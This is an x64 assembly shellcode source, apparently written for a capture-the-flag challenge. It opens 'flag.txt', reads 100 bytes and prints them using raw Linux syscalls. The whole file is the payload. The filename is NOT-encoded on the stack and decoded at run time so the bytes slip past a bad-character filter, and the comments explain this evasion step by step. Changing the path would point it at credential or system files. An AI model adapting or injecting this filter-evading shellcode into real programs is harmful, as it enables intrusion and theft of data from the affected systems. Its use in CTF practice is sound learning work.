; x64 open("flag.txt", O_RDONLY) + read(fd, buf, 100) + write(1, buf, 100)
; filename is NOT-encoded on the stack to avoid bad chars that would
; appear if "flag.txt" were pushed as a raw immediate
; size: 56 bytes
global _start

section .text

_start:

    xor r11d, r11d
    mov eax, r11d
    mov rbx, 0x8b878bd1989e9399   ; NOT("flag.txt\0") avoids disallowed bytes
    xor rbx, 0xFFFFFFFFFFFFFFFF    ; decode: rbx = "flag.txt" (packed, little-endian)
    push rax                        ; null terminator
    push rbx                        ; "flag.txt" string on the stack
    mov rdi, rsp                     ; rdi = pointer to "flag.txt"
    mov esi, eax                     ; rsi = flags = O_RDONLY (0)
    mov edx, eax                     ; rdx = mode = 0 (unused)
    mov al, 2                         ; syscall number for open
    syscall
    ; rax now holds the fd returned by open

    mov rdi, rax                      ; rdi = fd to read from
    xor r11d, r11d
    mov eax, r11d                      ; eax = 0 -> syscall number for read
    mov rsi, rsp                        ; rsi = buffer (reuse stack, filename no longer needed)
    mov dl, 100                          ; rdx = count = 100 bytes
    syscall
    ; rax now holds number of bytes read

    mov dil, 1                           ; rdi = out_fd = 1 (stdout)
    mov al, 1                             ; syscall number for write
    syscall
